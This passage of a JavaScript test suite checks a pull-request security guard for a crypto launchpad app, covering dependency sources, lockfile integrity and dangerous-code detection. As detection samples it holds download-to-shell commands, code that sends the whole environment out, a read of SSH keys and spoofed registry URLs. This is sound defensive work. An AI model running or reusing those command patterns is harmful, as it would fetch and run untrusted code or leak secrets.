    assert.ok(large.some((f) => f.rule === "svg-active" && f.detail === "a script or an embedded document"), "past the size that is matched line by line");
    const unreadable = { changes: [{ status: "M", path: "app/public/x.svg", oldMode: "100644", newMode: "100644", oldSha: "2".repeat(40), newSha: "3".repeat(40) }], blob: () => null, baseText: () => null, baseMatches: () => [], basePaths: () => [], diff: () => ({ added: [], removed: [] }) };
    assert.deepEqual(analyze(unreadable, { lockedPaths: LOCKED }).map((f) => [f.rule, f.tier, f.detail]), [["security-config", "review", "changed"], ["svg-active", "block", "could not be checked: larger than 25 MB"]]);
  });
});

// ---------- dependencies ----------

describe("dependencies", () => {
  const bump = { "app/package.json": manifest({ dependencies: { sharp: "^0.35.5", viem: "^2.47.6" } }), "app/package-lock.json": lockfile({ ...BASE_LOCK, sharp: entry("sharp", "0.35.5") }) };

  test("a clean version bump needs an owner and says what moved", () => {
    const found = check(bump);
    assert.deepEqual(rules(found), ["dependencies"]);
    assert.match(details(found, "dependencies"), /sharp \^0\.35\.4 → \^0\.35\.5/);
    assert.match(details(found, "dependencies"), /1 changed: sharp@0\.35\.5/);
  });

  test("a new dependency is named", () => {
    const found = check({ "app/package.json": manifest({ dependencies: { sharp: "^0.35.4", viem: "^2.47.6", leftpad: "^1.0.0" } }), "app/package-lock.json": lockfile({ ...BASE_LOCK, leftpad: entry("leftpad", "1.0.0") }) });
    assert.deepEqual(rules(found), ["dependencies"]);
    assert.match(details(found, "dependencies"), /leftpad \^1\.0\.0 added/);
    assert.match(details(found, "dependencies"), /1 package added: leftpad@1\.0\.0/);
  });

  test("a lockfile entry from anywhere but the npm registry is blocked", () => {
    for (const resolved of ["https://github.com/someone/sharp/tarball/main", "https://registry.npmjs.org.evil.io/sharp/-/sharp-0.35.4.tgz", "git+ssh://git@github.com/someone/sharp.git#abc", "http://registry.npmjs.org/sharp/-/sharp-0.35.4.tgz"]) {
      const found = check({ "app/package-lock.json": lockfile({ ...BASE_LOCK, sharp: entry("sharp", "0.35.4", { resolved }) }) });
      assert.ok(rules(found).includes("lockfile"), resolved);
    }
  });

  test("an entry that resolves to another package's tarball is blocked", () => {
    const found = lintNpmLock("app/package-lock.json", lockfile({ ...BASE_LOCK, viem: { ...entry("viem", "2.47.6"), resolved: "https://registry.npmjs.org/v1em/-/v1em-2.47.6.tgz" } }), lockfile(BASE_LOCK));
    assert.match(details(found, "lockfile"), /viem@2\.47\.6 does not resolve to its own registry tarball/);
  });

  test("a missing or weak integrity hash is blocked", () => {
    const { integrity: _dropped, ...bare } = entry("viem", "2.47.6");
    assert.ok(rules(lintNpmLock("p", lockfile({ ...BASE_LOCK, viem: bare }), lockfile(BASE_LOCK))).includes("lockfile"));
    assert.ok(rules(lintNpmLock("p", lockfile({ ...BASE_LOCK, viem: entry("viem", "2.47.6", { integrity: "sha1-abc=" }) }), lockfile(BASE_LOCK))).includes("lockfile"));
  });

  test("aliases, local links and bundled packages are blocked", () => {
    const alias = lintNpmLock("p", lockfile({ ...BASE_LOCK, lodash: { ...entry("evil-lodash", "4.0.0"), name: "evil-lodash" } }), lockfile(BASE_LOCK));
    assert.match(details(alias, "lockfile"), /lodash is an alias for evil-lodash/);
    assert.ok(rules(lintNpmLock("p", lockfile({ ...BASE_LOCK, local: { link: true, resolved: "../local" } }), lockfile(BASE_LOCK))).includes("lockfile"));
    assert.ok(rules(lintNpmLock("p", lockfile({ ...BASE_LOCK, inner: { version: "1.0.0", inBundle: true } }), lockfile(BASE_LOCK))).includes("lockfile"));
  });

  test("a scoped package and a nested copy resolve under their own names", () => {
    const nested = { ...JSON.parse(lockfile(BASE_LOCK)) };
    nested.packages["node_modules/sharp/node_modules/@scope/pkg"] = entry("@scope/pkg", "2.0.0");
    assert.deepEqual(rules(lintNpmLock("p", JSON.stringify(nested), lockfile(BASE_LOCK))), ["dependencies"]);
  });

  test("a new package with an install script is blocked; a bump of one that already had it is not", () => {
    const fresh = check({ "app/package-lock.json": lockfile({ ...BASE_LOCK, miner: entry("miner", "1.0.0", { hasInstallScript: true }) }) });
    assert.deepEqual(rules(fresh), ["dependencies", "install-script"]);
    const bumped = check({ "app/package-lock.json": lockfile({ ...BASE_LOCK, esbuild: entry("esbuild", "0.29.0", { hasInstallScript: true }) }) });
    assert.deepEqual(rules(bumped), ["dependencies"]);
  });

  test("an unreadable lockfile is blocked", () => {
    assert.deepEqual(rules(check({ "app/package-lock.json": "{ not json" })), ["lockfile"]);
    assert.deepEqual(rules(check({ "app/package-lock.json": '{ "lockfileVersion": 1, "dependencies": {} }\n' })), ["lockfile"]);
  });

  test("a lifecycle script in package.json is blocked", () => {
    for (const name of ["preinstall", "postinstall", "prepare"]) {
      const found = check({ "app/package.json": manifest({ scripts: { test: "tsx --test", build: "next build", [name]: "node setup.js" } }) });
      assert.deepEqual(rules(found), ["install-script"], name);
    }
  });

  test("a changed or added npm script needs an owner", () => {
    const found = check({ "app/package.json": manifest({ scripts: { test: "true", build: "next build", pretest: "node x.js" } }) });
    assert.deepEqual(rules(found), ["dependencies"]);
    assert.match(details(found, "dependencies"), /npm script "test" changed/);
    assert.match(details(found, "dependencies"), /npm script "pretest" added/);
  });

  test("a dependency from git, a URL, a folder or under an alias is blocked", () => {
    for (const spec of ["github:someone/viem", "git+https://github.com/someone/viem.git", "https://example.org/viem.tgz", "file:../viem", "npm:v1em@^2.0.0", "someone/viem#main"]) {
      const found = lintManifest("app/package.json", manifest({ dependencies: { sharp: "^0.35.4", viem: spec } }), manifest({}));
      assert.deepEqual(rules(found), ["dependency-source"], spec);
    }
  });

  test("every way npm reads a spec as a folder, a file or a git remote is blocked", () => {
    const local = ["../../vendor/viem", "./vendor/pkg/viem.tgz", "/opt/viem", "~/viem", ".", "..", "viem-2.0.0.tgz", "viem.tar.gz", "viem.tar-gz", "viem.tarXgz", "C:\\viem", "..\\viem", " ./viem"];
    const remote = ["git@github.com:someone/viem.git", "someone/viem", "gist:11081aaa281", "workspace:*", "catalog:", "jsr:@someone/viem"];
    for (const spec of [...local, ...remote]) {
      const found = lintManifest("app/package.json", manifest({ dependencies: { sharp: "^0.35.4", viem: spec } }), manifest({}));
      assert.deepEqual(rules(found), ["dependency-source"], spec);
    }
    // through the whole guard it is a block, for a change to package.json alone
    const found = check({ "app/package.json": manifest({ dependencies: { sharp: "^0.35.4", viem: "../../vendor/viem" } }) });
    assert.deepEqual(found.map((f) => [f.rule, f.tier]), [["dependency-source", "block"]]);
  });

  test("deleting the manifest or a lockfile is a change to the dependencies", () => {
    const lock = check({ "app/package-lock.json": null });
    assert.deepEqual(lock.map((f) => [f.rule, f.tier, f.detail]), [["dependencies", "review", "deleted, so nothing pins the packages it listed"]]);
    assert.deepEqual(check({ "app/package.json": null }).map((f) => [f.rule, f.detail]), [["dependencies", "deleted"]]);
    const deleted = (path) => ({ status: "D", path, oldMode: "100644", newMode: "000000", oldSha: "2".repeat(40), newSha: "0".repeat(40) });
    const repo = { changes: [deleted("app/yarn.lock"), deleted("app/npm-shrinkwrap.json"), deleted("docs/guide.md")], blob: () => null, baseText: () => null, baseMatches: () => [], basePaths: () => [], diff: () => ({ added: [], removed: [] }) };
    assert.deepEqual(analyze(repo, { lockedPaths: LOCKED }).map((f) => [f.rule, f.path]), [["dependencies", "app/yarn.lock"], ["dependencies", "app/npm-shrinkwrap.json"]]);
  });

  test("a manifest or lockfile is read whole whatever its size, so padding cannot hide what is in it", () => {
    const padding = " ".repeat(2_100_000);
    const padded = check({ "app/package.json": manifest({ dependencies: { sharp: "^0.35.4", viem: "github:someone/viem" } }) + padding });
    assert.match(details(padded, "dependency-source"), /viem comes from "github:someone\/viem"/);
    const paddedLock = check({ "app/package-lock.json": lockfile({ ...BASE_LOCK, sharp: entry("sharp", "0.35.4", { resolved: "https://example.org/sharp-0.35.4.tgz" }) }) + padding });
    assert.deepEqual(rules(paddedLock), ["dependencies", "lockfile"], "linted, not set aside as too large");
    assert.match(details(paddedLock, "lockfile"), /sharp@0\.35\.4 does not resolve to its own registry tarball/);
  });

  test("a manifest or lockfile the guard cannot check is blocked, not passed on for review", () => {
    // nested deeper than the reader can follow, beside a dependency from git
    const depth = 50_000;
    const nested = manifest({ dependencies: { sharp: "^0.35.4", viem: "github:someone/viem" } }).replace(/\n\}\n$/, `,\n  "resolutions": ${'{"a":'.repeat(depth)}"1.0.0"${"}".repeat(depth)}\n}\n`);
    const unreadable = check({ "app/package.json": nested });
    assert.deepEqual(unreadable.map((f) => [f.rule, f.tier]), [["dependency-source", "block"]]);
    assert.match(unreadable[0].detail, /^(could not be checked: could not be read|is not a valid package\.json)/);

    // past the number of files one pull request may have scanned
    const filler = Array.from({ length: 1500 }, (_, i) => ({ status: "A", path: `a/${i}.md`, oldMode: "000000", newMode: "100644", oldSha: "0".repeat(40), newSha: "1".repeat(40) }));
    const changed = (path) => ({ status: "M", path, oldMode: "100644", newMode: "100644", oldSha: "2".repeat(40), newSha: "3".repeat(40) });
    const repo = { changes: [...filler, changed("app/package-lock.json"), changed("app/package.json"), changed("app/src/lib/x.ts")], blob: () => Buffer.from("notes\n"), baseText: () => null, baseMatches: () => [], basePaths: () => [], diff: () => ({ added: [], removed: [] }) };
    assert.deepEqual(analyze(repo, { lockedPaths: LOCKED }).map((f) => [f.rule, f.tier, f.path]), [["lockfile", "block", "app/package-lock.json"], ["dependency-source", "block", "app/package.json"], ["unread", "block", "app/src/lib/x.ts"]]);

    // larger than the guard reads at all
    const huge = { ...repo, changes: [changed("app/package.json"), changed("app/src/lib/x.ts")], blob: () => null };
    assert.deepEqual(analyze(huge, { lockedPaths: LOCKED }).map((f) => [f.rule, f.tier]), [["dependency-source", "block"], ["unread", "block"]]);
  });

  test("a lockfile and a file too large to scan are still read for credentials and hidden characters", () => {
    const key = "c0ffee".repeat(10) + "abcd";
    const lock = JSON.parse(lockfile(BASE_LOCK));
    lock.notes = { deployer: `private key 0x${key}`, label: `user${cp(0x202e)}nimda` };
    assert.deepEqual(rules(check({ "app/package-lock.json": `${JSON.stringify(lock, null, 2)}\n` })), ["dependencies", "hidden-unicode", "secret"]);
    const large = check({ "app/src/lib/large.ts": `${"export const a = 1;\n".repeat(110_000)}const PRIVATE_KEY = "0x${key}";\nconst role = "user${cp(0x202e)}";\neval(input);\n` });
    assert.deepEqual(large.map((f) => [f.rule, f.tier, f.line]), [["secret", "block", 110_001], ["hidden-unicode", "block", 110_002], ["unscanned", "review", null]]);
    assert.match(details(large, "unscanned"), /a text file of 3 MB, read for credentials and hidden characters only/);
    // past the number of findings listed for one file, the report says how many it left out, as it does for any file
    const flood = check({ "app/src/lib/flood.ts": `${"export const a = 1;\n".repeat(110_000)}${`const role = "user${cp(0x202e)}";\n`.repeat(250)}` });
    assert.equal(of(flood, "hidden-unicode").length, 200);
    assert.equal(details(flood, "unscanned"), "50 more findings in this file are not listed | a text file of 3 MB, read for credentials and hidden characters only");
    // a registry hash is not a credential, even where a stretch of it reads like an access key
    const lookalike = lockfile({ ...BASE_LOCK, leftpad: entry("leftpad", "1.0.0", { integrity: `sha512-${"x".repeat(65)}+AKIA${"ABCDEFGHIJKLMNOP"}==` }) });
    assert.deepEqual(rules(check({ "app/package-lock.json": lookalike })), ["dependencies"]);
  });

  test("a lockfile entry needs a real package name and a real version, so that its address is its own", () => {
    const hash = `sha512-${"A".repeat(86)}==`;
    // "left-pad" at a version that walks the address over to another package's tarball
    const walked = { version: "x/../../../../is-number/-/is-number-7.0.0", resolved: "https://registry.npmjs.org/left-pad/-/left-pad-x/../../../../is-number/-/is-number-7.0.0.tgz", integrity: hash };
    assert.match(details(lintNpmLock("p", lockfile({ ...BASE_LOCK, "left-pad": walked }), lockfile(BASE_LOCK)), "lockfile"), /^left-pad: its version is not a version number$/);
    assert.match(details(lintNpmLock("p", lockfile({ ...BASE_LOCK, "left pad": entry("left pad", "1.0.0") }), lockfile(BASE_LOCK)), "lockfile"), /not a package name/);
    assert.match(details(lintNpmLock("p", lockfile({ ...BASE_LOCK, "a/../viem": entry("a/../viem", "1.0.0") }), lockfile(BASE_LOCK)), "lockfile"), /not a package name/);
    // names and versions the registry really has
    const real = { ...BASE_LOCK, JSONStream: entry("JSONStream", "1.3.5"), "@types/node": entry("@types/node", "20.19.0"), next: entry("next", "16.3.8-canary.1"), semver: entry("semver", "7.7.2+build.5") };
    assert.deepEqual(rules(lintNpmLock("p", lockfile(real), lockfile(BASE_LOCK))), ["dependencies"]);
  });

  test("a binding.gyp is blocked: npm builds it at install time with no script in package.json", () => {
    assert.deepEqual(check({ "app/binding.gyp": '{ "targets": [{ "target_name": "addon" }] }\n' }).map((f) => [f.rule, f.tier]), [["install-script", "block"]]);
  });

  test("a credential is never repeated in a finding, wherever it was written", () => {
    const token = "ghp_" + "a1B2".repeat(9);
    const password = "hunter2" + "-deploy-pass";
    const found = check({ "app/package.json": manifest({ dependencies: { sharp: token, viem: "^2.47.6", priv: `git+https://x-access-token:${token}@github.com/o/r.git`, kit: `git+https://deploy:${password}@git.example.org/o/kit.git` } }) });
    assert.deepEqual(rules(found), ["dependencies", "dependency-source", "secret"]);
    assert.equal(details(found, "dependency-source"), 'priv comes from "git+https://x-access-token:<a GitHub token>@github.com/o/r.git" | kit comes from "git+https://<credentials>@git.example.org/o/kit.git"');
    assert.match(details(found, "dependencies"), /sharp \^0\.35\.4 → <a GitHub token>/);
    const report = JSON.stringify(found) + renderText(found, verdict(found, {})) + renderSummary(found, verdict(found, {}), { headSha: "a".repeat(40) });
    assert.ok(!report.includes(token) && !report.includes(password));
  });

  test("an override may point at one of this package's own dependencies, and at nothing else", () => {
    const references = lintManifest("app/package.json", manifest({ overrides: { ox: "$viem", "@scope/kit": "$@scope/pkg" } }), manifest({}));
    assert.deepEqual(rules(references), ["dependencies"]);
    assert.deepEqual(rules(lintManifest("app/package.json", manifest({ overrides: { ox: "$../viem" } }), manifest({}))), ["dependency-source"]);
    assert.deepEqual(rules(lintManifest("app/package.json", manifest({ dependencies: { sharp: "^0.35.4", viem: "$sharp" } }), manifest({}))), ["dependency-source"], "only overrides have references");
  });

  test("an override is read like any other dependency", () => {
    const found = lintManifest("app/package.json", manifest({ overrides: { viem: { ox: "github:someone/ox" } } }), manifest({}));
    assert.match(details(found, "dependency-source"), /viem > ox comes from "github:someone\/ox"/);
  });

  test("ordinary version ranges are not mistaken for off-registry sources", () => {
    for (const spec of ["^1.2.3", "~1.2.3", "1.2.3", ">=1.2.3 <2", "1.x", "*", "latest", "19.2.3", "^16.3.8-canary.1", "^1 || ^2", "1.2.3 - 2.0.0", "1.0.0+build.5", "v1.2.3", "next", ""]) {
      assert.deepEqual(rules(lintManifest("app/package.json", manifest({ dependencies: { sharp: "^0.35.4", viem: spec } }), manifest({}))), ["dependencies"], spec);
    }
  });

  test("a second package manager's lockfile, or a second manifest, needs an owner", () => {
    assert.deepEqual(rules(check({ "app/yarn.lock": "# yarn lockfile v1\n" })), ["dependencies"]);
    assert.match(details(check({ "tools/package.json": '{ "name": "tools" }\n' }), "dependencies"), /a new package manifest/);
  });

  test("a download piped to a shell inside an npm script is called out", () => {
    const found = check({ "app/package.json": manifest({ scripts: { test: "tsx --test", build: "curl -s https://example.org/i.sh | sh && next build" } }) });
    assert.deepEqual(rules(found), ["dangerous-code", "dependencies"]);
  });
});

// ---------- application code ----------

describe("application code", () => {
  const config = BASE["app/src/lib/launchpad/config.ts"];

  test("swapping an address is caught, and a new one is marked as new", () => {
    const found = check({ "app/src/lib/launchpad/config.ts": config.replace(ROUTER, STRANGER) });
    assert.deepEqual(rules(found), ["address"]);
    assert.equal(found[0].detail, `${STRANGER} (new to the repository)`);
    assert.equal(found[0].line, 2);
  });

  test("an address the repository already has is still shown, marked as known", () => {
    const found = check({ "app/src/lib/launchpad/extra.ts": `export const FEE_TO = "${ROUTER.toLowerCase()}";\n` });
    assert.match(details(found, "address"), /already in the repository/);
  });

  test("the zero and burn addresses, hashes, and addresses in tests are not findings", () => {
    assert.deepEqual(rules(check({ "app/src/lib/x.ts": `const a = "0x${"0".repeat(40)}", b = "0x000000000000000000000000000000000000dEaD", h = "0x${"ab".repeat(32)}";\n` })), []);
    assert.deepEqual(rules(check({ "app/src/lib/x.test.ts": `const who = "${STRANGER}";\n` })), []);
  });

  test("an address in the README needs an owner too", () => {
    assert.deepEqual(rules(check({ "README.md": `${BASE["README.md"]}\nFactory: ${STRANGER}\n` })), ["address"]);
  });

  test("wallet calls are flagged in app code and ignored in tests", () => {
    const found = check({ "app/src/components/Buy.tsx": 'await writeContract(config, { address, abi, functionName: "approve", args: [spender, maxUint256] });\n' });
    assert.deepEqual(rules(found), ["wallet-call"]);
    assert.match(details(found, "wallet-call"), /writeContract/);
    assert.match(details(found, "wallet-call"), /functionName: "approve"/);
    assert.match(details(found, "wallet-call"), /maxUint256/);
    assert.deepEqual(rules(check({ "app/src/components/buy.test.ts": "await signMessage({ message });\n" })), []);
  });

  test("a wallet RPC method is a quoted string; a database column that starts with wallet_ is not one", () => {
    assert.match(details(check({ "app/src/lib/switch.ts": 'await provider.request({ method: "wallet_switchEthereumChain", params });\n' }), "wallet-call"), /"wallet_switchEthereumChain"/);
    assert.deepEqual(rules(check({ "app/src/lib/q.ts": "const rows = await sql`select wallet_fees_quote_paid from fees`;\n" })), []);
  });

  test("a new host is flagged, in code, tests and docs; a known or local one is not", () => {
    assert.deepEqual(rules(check({ "app/src/lib/track.ts": 'await fetch("https://collect.metrics-cdn.io/v1", { method: "POST", body });\n' })), ["new-host"]);
    assert.deepEqual(rules(check({ "app/src/lib/track.test.ts": 'await fetch("https://collect.metrics-cdn.io/v1");\n' })), ["new-host"]);
    assert.deepEqual(rules(check({ "README.md": `${BASE["README.md"]}Claim here: https://openlaunch-airdrop.xyz\n` })), ["new-host"]);
    assert.deepEqual(rules(check({ "app/src/lib/rpc.ts": 'const a = "https://mainnet.base.org/x", b = "http://localhost:3000", c = "http://127.0.0.1:8545";\n' })), []);
  });

  test("a host that only a lockfile mentions is still new to the code", () => {
    assert.deepEqual(rules(check({ "app/src/lib/meta.ts": 'await fetch("https://registry.npmjs.org/-/npm/v1/tokens");\n' })), ["new-host"]);
  });

  test("a host built at run time is flagged, since it cannot be compared", () => {
    assert.match(details(check({ "app/src/lib/send.ts": "await fetch(`https://${target}/in`);\n" }), "new-host"), /\(computed\)/);
    // joined on from a separate string: no host follows the scheme, so there is nothing to compare either
    for (const line of ['await fetch("https://" + target);', "await fetch('https://' + 'collect.metrics-cdn.io/x');", 'const scheme = "wss://";', 'const url = ["https://", host].join("");']) {
      const found = check({ "app/src/lib/send.ts": `${line}\n` });
      assert.deepEqual(found.map((f) => [f.rule, f.detail, f.line]), [["new-host", "(computed)", 1]], line);
    }
    // once per line, beside any host that is written out
    const both = check({ "app/src/lib/send.ts": 'const a = "https://collect.metrics-cdn.io/v1", b = "https://" + host, c = `https://${host}`;\n' });
    assert.equal(details(both, "new-host"), "collect.metrics-cdn.io | (computed)");
    // a known host written in full is still not a finding, and prose that mentions a scheme is not code
    assert.deepEqual(rules(check({ "app/src/lib/rpc.ts": 'const a = "https://mainnet.base.org/x";\n' })), []);
    assert.deepEqual(rules(check({ "docs/guide.md": "## Guide\n\nLinks must start with https:// and nothing else.\n" })), []);
  });

  test("an address that is finished somewhere else is a computed host too", () => {
    const computed = [
      'await fetch("https://@" + target);', // an empty user name, then the host
      'await fetch("https://:@" + target);',
      'await fetch("https://mainnet.base.org" + ".collect.metrics-cdn.io/x");', // a known host, made into another one
      'await fetch("https://mainnet.base.org." + tail);',
      'await fetch("https://mainnet.base.org".concat(tail));',
      'await fetch("//" + target);', // no scheme: the page's own
    ];
    for (const line of computed) assert.deepEqual([...hostsIn(line, true)].filter((host) => host === "(computed)"), ["(computed)"], line);
    assert.deepEqual(check({ "app/src/lib/send.ts": `${computed[2]}\n` }).map((f) => [f.rule, f.detail]), [["new-host", "(computed)"]]);
    // a path, a query or a fragment joined on leaves the host as it is written
    for (const line of ['fetch("https://mainnet.base.org" + "/v1/" + id);', 'fetch("https://mainnet.base.org" + "?id=" + id);', 'const site = "https://mainnet.base.org";']) {
      assert.deepEqual(rules(check({ "app/src/lib/send.ts": `${line}\n` })), [], line);
    }
    // comparing a protocol is not building an address
    assert.deepEqual(rules(check({ "app/src/lib/link.ts": 'if (u.protocol !== "https:" && u.protocol !== "http:") return null;\n' })), []);
  });

  test("a host is read out of escaped slashes, an address with no scheme, and a wildcard", () => {
    const hosts = (line) => details(check({ "app/src/lib/send.ts": `${line}\n` }), "new-host");
    assert.equal(hosts('await fetch("https:\\/\\/collect.metrics-cdn.io/x");'), "collect.metrics-cdn.io");
    assert.equal(hosts("const seen = /https:\\/\\/collect\\.metrics-cdn\\.io\\/v1/.test(url);"), "collect.metrics-cdn.io");
    assert.equal(hosts('await fetch("//cdn.metrics-cdn.io/a.json");'), "cdn.metrics-cdn.io");
    assert.equal(hosts('const csp = "connect-src https://*.metrics-cdn.io wss://*.metrics-cdn.io";'), "*.metrics-cdn.io");
    // patterns that test or trim an address name no host, and neither does a comment or another scheme
    const none = [
      'lines.push("// not an address");', "const half = a // b.c", 'const ipfs = "ipfs://bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi";',
      "const re = /^https?:\\/\\//i;", "const ok = /^https:\\/\\//.test(v.trim());", 'const base = siteUrl.replace(/\\/$/, "");',
      "assert.match(url, /^https:\\/\\/[^/]+$/);", "const m = /^https:\\/\\/(?:www\\.)?(?:x|twitter)\\.com\\/([A-Za-z0-9_]{1,15})$/i.exec(url);",
    ];
    for (const line of none) assert.equal(hosts(line), "", line);
    assert.equal(hostOf("localhost:*"), "localhost");
    assert.equal(hostOf("openlaunch.lol]"), "openlaunch.lol");
    assert.equal(hostOf("[::1]:8545"), "[::1]");
    assert.equal(hostOf("@"), null);
  });

  test("hostOf strips credentials, ports and case", () => {
    assert.equal(hostOf("User:pw@Example-RPC.io:8443"), "example-rpc.io");
    assert.equal(hostOf("evil_site.com"), "evil_site.com");
    assert.equal(hostOf("${host}"), "(computed)");
  });

  test("code execution, raw HTML and process spawning are flagged, in tests as well", () => {
    const samples = {
      "eval()": ["const out = eval(source);", "const out = (0, eval)(source);", "const run = eval;", "window.eval?.(source);"],
      "the Function constructor": ['const run = new Function("return 1");', 'const run = Function("return 1");', 'globalThis.Function("return 1")();'],
      "a timer given its code as a string": 'setTimeout("go()", 0);',
      "a script, frame or embed tag": ['const s = document.createElement("script");', "<iframe src={src} />"],
      "raw HTML injection": "<div dangerouslySetInnerHTML={{ __html: bio }} />",
      "starting a process": 'import { execSync } from "node:child_process";',
      "a computed import or require": "const mod = await import(name);",
      "reading the whole environment": ["await send(JSON.stringify(process.env));", "const { ADMIN_SIGNER_KEY } = process.env;", "const env = process.env;", "spawn(cmd, { env: process.env });", "const all = { ...process.env };"],
      "decoding hidden text": 'const payload = atob("aGk=");',
      "a download piped to a shell": "curl -fsSL https://example.org/install.sh | bash",
      "reading the home directory or a key store": 'readFileSync(join(homedir(), ".ssh/id_ed25519"));',
    };
    for (const [what, texts] of Object.entries(samples)) {
      for (const text of [texts].flat()) {
        for (const path of ["app/src/lib/util.ts", "app/src/lib/util.test.ts"]) {
          const found = scanLines(path, [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(), env: new Set() });
          assert.ok(of(found, "dangerous-code").some((f) => f.detail === what), `${what}: ${text} in ${path}`);
        }
      }
    }
  });

  test("a file is read as code whatever its extension; prose is not", () => {
    assert.deepEqual(rules(check({ "app/src/lib/helper": "eval(input);\n" })), ["dangerous-code"]);
    assert.deepEqual(rules(check({ "app/src/lib/helper.weird": "eval(input);\n" })), ["dangerous-code"]);
    assert.deepEqual(rules(check({ "docs/guide.md": "Never call `eval(input)` on user text.\n" })), []);
  });

  test("a file Next.js serves as a page is app code whatever it is called, and so is code with a prose-like name", () => {
    const page = check({ "app/src/pages/airdrop.test.tsx": 'export default function Page() {\n  return <button onClick={() => writeContract(config, { functionName: "approve" })}>Claim</button>;\n}\n' });
    assert.deepEqual(rules(page), ["wallet-call"]);
    assert.deepEqual(rules(check({ "app/src/lib/LICENSES.ts": "export const run = (input) => eval(input);\n" })), ["dangerous-code"]);
    assert.deepEqual(rules(check({ "NOTICE": "Portions of this software call eval(input) in tests.\n", "docs/LICENSE-MIT.txt": "MIT, see eval(input).\n" })), []);
  });

  test("the app's own checks are known by name, and one that is commented out counts as removed", () => {
    const facts = { addresses: new Set(), hosts: new Set(), env: new Set() };
    const dropped = scanLines("app/src/app/api/upload/route.ts", [{ n: 4, text: "  return save(body);" }], ["  const meta = validateMeta(body);", "  if (!(await admitAdmin(request))) return denied();", "  await checkUpload(file);", "  assertBridgeWalletQueueClear(queue);"], facts);
    assert.equal(details(dropped, "auth-removed"), "validateMeta: 1 fewer use | admitAdmin: 1 fewer use | checkUpload: 1 fewer use | assertBridgeWalletQueueClear: 1 fewer use");
    const commented = check({ "app/src/app/api/post/route.ts": ROUTE.replace("  if (await rateLimited(request))", "  // if (await rateLimited(request))") });
    assert.deepEqual(commented.map((f) => [f.rule, f.detail]), [["auth-removed", "rateLimited: 1 fewer use"]]);
  });

  test("app code cannot hide behind a test file's name", () => {
    const found = check({ "app/src/lib/pay.ts": 'import { TREASURY } from "./pay.test";\nexport const to = TREASURY;\n', "app/src/lib/pay.test.ts": `export const TREASURY = "${STRANGER}";\n` });
    assert.deepEqual(rules(found), ["dangerous-code"]);
    assert.equal(found[0].detail, "app code importing a test file");
    assert.deepEqual(rules(check({ "app/src/lib/a.test.ts": 'import { helper } from "./b.test";\n' })), [], "a test may import a test");
  });

  test("ordinary code that looks similar is left alone", () => {
    assert.deepEqual(rules(check({ "contracts/src/Vault.sol": "contract Vault {\n  function f(uint256 a) external pure { require(a > 0, \"zero\"); }\n}\n" })), ["contracts"], "Solidity's require is not Node's");
    const alike = [
      'const m = /a/.exec(text);', 'const mod = await import("./chart");', "const key = process.env.BASE_RPC_URL;", "particles.spawn(3);", 'el.textContent = "hi";',
      "const key = process.env?.BASE_RPC_URL;", 'const key = process.env["BASE_RPC_URL"];', "setTimeout(() => go(), 0);", "if (isFunction(value)) retrieval(value);",
      "const csp = \"script-src 'self' 'unsafe-eval'\";", 'const box = document.createElement("div");', "type Handler = Function;",
    ];
    for (const text of alike) {
      assert.deepEqual(of(scanLines("app/src/lib/util.ts", [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(), env: new Set(["BASE_RPC_URL"]) }), "dangerous-code"), [], text);
    }
  });

  test("dropping a rate limit or a signature check is flagged", () => {
    const found = check({ "app/src/app/api/post/route.ts": ROUTE.replace("  if (await rateLimited(request)) return tooMany();\n", "").replace("!ok || ", "") });
    assert.deepEqual(rules(found), ["auth-removed"]);
    assert.match(details(found, "auth-removed"), /rateLimited: 1 fewer use/);
  });

  test("deleting a file removes the checks in it, unless they turn up again in what the pull request adds", () => {
    const route = "app/src/app/api/post/route.ts";
    const deleted = check({ [route]: null });
    assert.deepEqual(rules(deleted), ["auth-removed"]);
    assert.equal(details(deleted, "auth-removed"), "verifyMessage: 2 fewer uses, with the file deleted | rateLimited: 1 fewer use, with the file deleted | consumeNonce: 1 fewer use, with the file deleted");
    // moved to another path as it was
    assert.deepEqual(rules(check({ [route]: null, "app/src/app/api/v2/post/route.ts": ROUTE })), []);
    // written again at another path, without its rate limit
    const rewritten = check({ [route]: null, "app/src/app/api/v2/post/route.ts": ROUTE.replace("  if (await rateLimited(request)) return tooMany();\n", "") });
    assert.equal(details(rewritten, "auth-removed"), "rateLimited: 1 fewer use, with the file deleted");
    // a test or a document that is deleted held no checks of the app
    assert.deepEqual(rules(check({ "app/src/components/hero.test.ts": null, "README.md": null })), []);
    // one check that turns up again stands for one that went, not for every one
    const sha = (letter) => letter.repeat(40);
    const blobs = { [sha("a")]: "export const a = () => rateLimited(1);\n", [sha("b")]: "export const b = () => rateLimited(2);\n", [sha("c")]: "export const c = () => rateLimited(3);\n" };
    const change = (status, path, oldSha, newSha) => ({ status, path, oldMode: status === "A" ? "000000" : "100644", newMode: status === "D" ? "000000" : "100644", oldSha, newSha });
    const repo = {
      changes: [change("D", "app/src/lib/a.ts", sha("a"), sha("0")), change("D", "app/src/lib/b.ts", sha("b"), sha("0")), change("A", "app/src/lib/c.ts", sha("0"), sha("c"))],
      blob: (id) => Buffer.from(blobs[id]), baseText: () => null, baseMatches: () => [], basePaths: () => [], diff: () => ({ added: [], removed: [] }),
    };
    assert.deepEqual(analyze(repo, { lockedPaths: LOCKED }).map((f) => [f.rule, f.path, f.detail]), [["auth-removed", "app/src/lib/b.ts", "rateLimited: 1 fewer use, with the file deleted"]]);
  });

  test("moving a check within the file is not a removal", () => {
    const moved = ROUTE.replace("  if (await rateLimited(request)) return tooMany();\n", "").replace("  return save(", "  if (await rateLimited(request)) return tooMany();\n  return save(");
    assert.deepEqual(rules(check({ "app/src/app/api/post/route.ts": moved })), []);
  });

  test("a variable read through ?. or through the app's own helper is a new one as well", () => {
    const found = check({ "app/src/lib/knobs.ts": 'export const a = process.env?.ADMIN_SIGNER_KEY, b = intEnv("SYNC_NEW_KNOB", 5), c = intEnv("SYNC_OVERLAP_BLOCKS", 60), d = process.env?.BASE_RPC_URL;\n' });
    assert.deepEqual(found.map((f) => [f.rule, f.detail]), [["new-env", "ADMIN_SIGNER_KEY"], ["new-env", "SYNC_NEW_KNOB"]]);
  });

  test("a new environment variable is named; an existing one is not", () => {
    const found = check({ "app/src/lib/keys.ts": "const a = process.env.BASE_RPC_URL, b = process.env.ADMIN_SIGNER_KEY, c = process.env[\"NEXT_PUBLIC_NEW\"];\n" });
    assert.deepEqual(rules(found), ["new-env"]);
